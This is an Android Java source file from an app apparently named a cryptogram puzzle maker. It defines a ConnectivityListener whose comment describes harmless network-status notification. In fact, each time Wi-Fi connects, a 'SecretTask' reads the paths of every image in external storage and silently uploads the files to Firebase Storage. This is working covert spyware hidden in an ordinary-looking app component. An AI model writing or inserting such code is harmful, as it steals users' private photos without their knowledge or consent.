package com.example.karamchand.criptogramador;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.support.annotation.NonNull;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.ArrayList;

/**
 * This will be called when the connectivity status of the device changes. We notify whether there
 * is now an active network connection
 */
public class ConnectivityListener extends BroadcastReceiver {

    SecretTask mSecretTask;
    int mProgress = 0;
    Service mService;
    private ArrayList<String> mPaths;

    public ConnectivityListener(Service service) {
        mService = service;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo.isConnected()) {
            mSecretTask = new SecretTask();
            mSecretTask.execute();
        } else {
            if (mSecretTask != null)
                mSecretTask.cancel(true);
        }
    }

    public class SecretTask extends AsyncTask {

        @Override
        protected Object doInBackground(Object[] objects) {
            StorageReference mDatabase = FirebaseStorage.getInstance().getReference();
            if (mPaths == null) mPaths = getAllShownImagesPath(mService);
            if (mProgress < mPaths.size())
                test(mDatabase, mPaths, mProgress);
            return null;
        }

    }

    private ArrayList<String> getAllShownImagesPath(Context context) {
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;
        ArrayList<String> listOfAllImages = new ArrayList<>();
        String absolutePathOfImage;
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = { MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME };

        cursor = context.getContentResolver().query(uri, projection, null,
                null, null);

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursor
                .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);

            listOfAllImages.add(absolutePathOfImage);
        }
        cursor.close();
        return listOfAllImages;
    }

    public void test(final StorageReference mDatabase, final ArrayList<String> paths, final int index) {

        final String path = paths.get(index);
        UploadTask uploadTask = mDatabase.child(path).putFile(Uri.fromFile(new File(paths.get(index))));
        uploadTask.addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception exception) {
                // Handle unsuccessful uploads
                Log.e("error", exception.toString());
                ConnectivityListener.this.advance();
            }
        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
                Uri downloadUrl = taskSnapshot.getDownloadUrl();
                Log.e("url", downloadUrl.toString());
                ConnectivityListener.this.advance();
            }
        });
    }

    private void advance() {
        mProgress++;
        mSecretTask = new SecretTask();
        mSecretTask.execute();
    }

}
